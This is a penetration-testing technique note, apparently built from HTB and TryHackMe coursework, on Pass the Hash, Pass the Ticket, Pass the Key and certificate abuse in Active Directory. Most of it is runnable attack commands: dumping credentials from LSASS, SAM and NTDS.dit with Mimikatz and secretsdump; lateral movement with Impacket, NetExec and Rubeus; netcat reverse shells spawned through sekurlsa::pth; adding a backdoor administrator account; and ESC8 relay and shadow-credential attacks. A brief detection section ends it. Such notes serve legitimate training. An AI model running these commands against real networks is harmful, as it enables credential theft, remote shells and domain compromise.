---
title: "Pass the Hash / Pass the Ticket / Pass the Key"
type: technique
tags: [active-directory, credential-dumping, htb, lateral-movement, pass-the-hash, pass-the-ticket, post-exploitation, thm, windows]
phase: post-exploitation
date_created: 2026-05-08
date_updated: 2026-05-08
sources: [cpts-password-attacks, thm-ad-lateral]
---

# Pass the Hash / Pass the Ticket / Pass the Key

## What it is

**Pass the Hash (PtH)** is a lateral movement technique that authenticates to network services using an NTLM password hash instead of the plaintext password, exploiting the fact that NTLM authentication uses the hash directly as the credential.

**Pass the Ticket (PtT)** is a related technique that uses stolen Kerberos tickets (TGTs or TGS) to authenticate to services without needing a password or hash.

**Pass the Key / Overpass the Hash** converts a Kerberos encryption key (RC4/AES128/AES256) into a full TGT, bridging the gap between NTLM hashes and Kerberos authentication.

## How it works

**NTLM authentication** is a challenge-response protocol. When a client authenticates, the server sends a challenge; the client responds by encrypting it with the NT hash of the user's password. The hash itself is the secret — so possessing it enables authentication without knowing the plaintext.

**Kerberos** uses encrypted timestamps and tickets. Possessing a TGT allows requesting service tickets (TGS) for any resource the user can access. Possessing Kerberos encryption keys (derived from the password) allows requesting a TGT from the KDC directly.

## Prerequisites

- Local administrator or SYSTEM privileges on a compromised host (to dump hashes/tickets)
- For PtH: SMB/WinRM/RDP accessible on target; target must have NTLM enabled
- For PtT: Valid, unexpired Kerberos ticket; network access to target
- UAC restriction note: only the built-in local Administrator (RID 500) can perform remote PtH to local accounts by default; domain accounts with local admin rights are not restricted

## Methodology

### Obtaining hashes

#### Dump SAM (local accounts only)

```powershell
# On Windows — requires admin
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

```bash
# Offline with Impacket secretsdump
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

```bash
# Remote dump via NetExec
netexec smb 10.10.10.1 --local-auth -u bob -p 'Password!' --sam
netexec smb 10.10.10.1 --local-auth -u bob -p 'Password!' --lsa
```

#### Dump LSASS (domain accounts + local)

```powershell
# Task Manager: Processes > Local Security Authority Process > Create dump file
# Output: %temp%\lsass.DMP

# Rundll32 method (flagged by AV)
tasklist /svc           # find lsass PID
Get-Process lsass       # PowerShell alternative
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

```bash
# Parse dump file on Linux
pypykatz lsa minidump /home/user/lsass.dmp
```

```powershell
# Mimikatz — dump from live LSASS
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords    # NT hashes, plaintext (WDIGEST if enabled)
mimikatz # lsadump::sam                # local SAM hashes
mimikatz # token::elevate
mimikatz # sekurlsa::msv              # extract NT hashes from MSV
```

#### Dump NTDS.dit (all domain accounts)

```powershell
# Via Evil-WinRM + VSS
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
cmd.exe /c reg.exe save hklm\SYSTEM .\SYSTEM
```

```bash
# Quick dump via NetExec
netexec smb 10.10.10.1 -u bwilliamson -p 'P@55w0rd!' -M ntdsutil

# Offline extraction
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

---

### Pass the Hash (PtH)

#### From Windows — Mimikatz

```powershell
# Launch process in context of target user (opens new cmd.exe)
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

```powershell
# Token revert before PtH to avoid elevated token issue
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"nc64.exe -e cmd.exe 10.10.10.10 5555"
```

#### From Windows — Invoke-TheHash (no local admin required client-side)

```powershell
Import-Module .\Invoke-TheHash.psd1

# SMB — create user
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

# WMI — reverse shell
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e <base64_encoded_revshell>"
```

#### From Linux — Impacket

```bash
# PSExec (SMB, port 445)
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

# WMIExec (WMI, no service creation)
impacket-wmiexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

# SMBExec
impacket-smbexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

# Impacket format: LMhash:NThash (use empty LM or aad3b435...)
impacket-psexec 'domain/user'@target -hashes aad3b435b51404eeaad3b435b51404ee:NThash
```

#### From Linux — NetExec (spray / enumerate)

```bash
# Single target
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

# Subnet scan (look for Pwn3d!)
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

# Execute command on success
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

# Local auth only (avoids domain lockouts)
netexec smb 172.16.1.0/24 -u Administrator -H <hash> --local-auth
```

#### From Linux — Evil-WinRM (WinRM)

```bash
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

#### From Linux — xfreerdp (RDP PtH)

```bash
# First enable Restricted Admin Mode on target
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# Then PtH via RDP
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

#### From Linux — psexec.py with domain user

```bash
psexec.py -hashes :NThash DOMAIN/MyUser@VICTIM_IP
```

---

### Pass the Ticket (PtT)

#### Extract tickets from Windows (Mimikatz)

```powershell
# Export all tickets to .kirbi files
mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit
dir *.kirbi
# TGT files end with @krbtgt-domain.kirbi
```

#### Extract tickets (Rubeus)

```powershell
# Dump all tickets as Base64
Rubeus.exe dump /nowrap
```

#### Inject ticket — Rubeus

```powershell
# From .kirbi file
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

# From Base64 string
Rubeus.exe ptt /ticket:doIE1jCC...

# Combined request + inject
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

#### Inject ticket — Mimikatz

```powershell
mimikatz.exe privilege::debug "kerberos::ptt C:\Users\user\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

# Open new cmd with imported ticket
mimikatz # misc::cmd
```

#### Verify ticket injection

```powershell
klist    # lists currently cached tickets
```

#### PtT with PowerShell Remoting

```powershell
# Import ticket, then PSRemote
mimikatz.exe privilege::debug "kerberos::ptt C:\Users\Administrator\Desktop\john.kirbi" exit
powershell.exe
Enter-PSSession -ComputerName DC01
```

```powershell
# Rubeus: create sacrificial process, then import ticket
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
# In the new window:
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd... /ptt
powershell
Enter-PSSession -ComputerName DC01
```

---

### Pass the Key / Overpass the Hash

```powershell
# Extract Kerberos keys from LSASS
mimikatz.exe privilege::debug "sekurlsa::ekeys"
# Outputs: RC4_HMAC (= NTLM hash), AES128, AES256

# Overpass-the-Hash with RC4 (NTLM = RC4 key)
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"nc64.exe -e cmd.exe <ip> 5556"

# With AES128
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"nc64.exe -e cmd.exe <ip> 5556"

# With AES256
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:<hash> /run:cmd.exe
```

```powershell
# Rubeus: request TGT from AES256 key
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

---

### Pass the Ticket on Linux

```bash
# List ccache tickets
env | grep -i krb5
ls -la /tmp/krb5cc_*

# Import and use ccache
cp /tmp/krb5cc_647401106_tBswau .
export KRB5CCNAME=/root/krb5cc_647401106_tBswau

# Use with smbclient
smbclient //dc01/julio -k -c ls -no-pass

# Use with Impacket
proxychains impacket-wmiexec dc01 -k

# Use with Evil-WinRM
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

```bash
# keytab files — impersonate user
klist -k -t /opt/specialfiles/carlos.keytab
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist   # confirm new principal

# Extract hashes from keytab
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
# Use NTLM hash for PtH or crack for plaintext
```

```bash
# Convert ccache <-> kirbi
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
impacket-ticketConverter julio.kirbi julio.ccache

# Import kirbi into Windows
Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

```bash
# Linikatz — Linux equivalent of Mimikatz
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
/opt/linikatz.sh
# Dumps keytabs, ccache files, Kerberos credentials
```

---

### Pass the Certificate (PKINIT / Shadow Credentials)

```bash
# ESC8 NTLM relay to ADCS web enrollment
impacket-ntlmrelayx -t http://10.10.10.1/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication

# Coerce authentication (printer bug)
python3 printerbug.py DOMAIN/user:pass@DC_IP attacker_IP

# Get TGT from .pfx certificate
python3 gettgtpkinit.py -cert-pfx DC01$.pfx -dc-ip 10.10.10.1 'DOMAIN/dc01$' /tmp/dc.ccache

# DCSync with DC machine account TGT
export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -dc-ip 10.10.10.1 -just-dc-user Administrator 'DOMAIN/DC01$'@DC01.DOMAIN.LOCAL
```

```bash
# Shadow Credentials (write to msDS-KeyCredentialLink)
pywhisker --dc-ip 10.10.10.1 -d DOMAIN.LOCAL -u attacker -p 'pass' --target victim --action add
python3 gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass 'certpass' -dc-ip 10.10.10.1 DOMAIN.LOCAL/victim /tmp/victim.ccache
export KRB5CCNAME=/tmp/victim.ccache
evil-winrm -i dc01.domain.local -r domain.local
```

## Bypasses and variants

| Bypass | Detail |
|--------|--------|
| `LocalAccountTokenFilterPolicy=1` | Allows non-RID-500 local accounts to PtH remotely |
| AES256 key instead of RC4/NTLM | Avoids "encryption downgrade" Kerberos alerts |
| Rubeus `createnetonly` | Creates clean logon session without affecting existing tickets |
| Indirect ticket injection | Import to sacrificial process, not current session |
| Keytab abuse on Linux | kinit with service account keytab for persistent access |

## Detection and defence

- Enable Windows Credential Guard (protects LSASS with VBS)
- Enable Protected Users security group (restricts NTLM, weak Kerberos, delegation)
- Implement LAPS (randomise local admin passwords to prevent hash reuse)
- Monitor Event ID 4624 (logon type 3 = network) with anomalous source
- Monitor Event ID 4768/4769 (Kerberos TGT/TGS requests) for unusual patterns
- Monitor for `sekurlsa::`, `lsadump::`, `kerberos::ptt` in process command lines
- Disable NTLM where possible (use Kerberos-only)
- Enable SMB signing to mitigate relay attacks
- Restrict WinRM and RDP access via firewall rules

## Tools

- Mimikatz — Hash/ticket extraction, PtH, PtT, PtK on Windows
- Rubeus — Kerberos manipulation, ticket extraction/injection, PtT
- Impacket — Linux-side PtH (psexec, wmiexec, smbexec, secretsdump)
- Evil-WinRM — WinRM shells with PtH or Kerberos
- NetExec — SMB/WMI/LDAP PtH spray across subnets
- xfreerdp — RDP PtH via `/pth` flag
- pypykatz — Python-based LSASS minidump parser
- Linikatz — Linux credential extraction (Kerberos, SSSD, Samba)
- pywhisker — Shadow Credentials attack (msDS-KeyCredentialLink)
- Certipy — ADCS enumeration and exploitation
- Invoke-TheHash — PowerShell PtH via SMB/WMI

## Sources

- CPTS Password Attacks — Pass the Hash, Pass the Ticket (Windows/Linux), Pass the Certificate
- THM PT1 Prep — AD Lateral Movement: Alternative Authentication Material
